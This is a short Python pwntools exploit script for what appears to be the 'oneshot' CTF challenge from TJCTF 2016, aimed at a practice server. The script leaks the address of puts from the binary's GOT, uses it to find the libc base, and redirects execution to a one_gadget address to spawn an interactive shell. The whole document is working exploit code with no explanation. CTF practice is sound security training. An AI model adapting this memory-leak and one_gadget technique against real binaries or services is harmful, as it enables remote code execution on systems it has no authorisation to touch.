from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './oneshot_tjctf_2016'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',26869) if argv[1]=='r' else process(binary)

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

puts_got = elf.got['puts']
io.sendlineafter(b'Read location?',int2bytes(puts_got))
io.recvuntil(b'Value: ')
puts_addr = int(bytes2int(io.recv(18)),16)
libc = LibcSearcher('puts', puts_addr)
base = puts_addr - libc.dump('puts')
one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = one_gadgets[0] + base

io.sendlineafter(b'Jump location?',int2bytes(one_gadget))

io.interactive()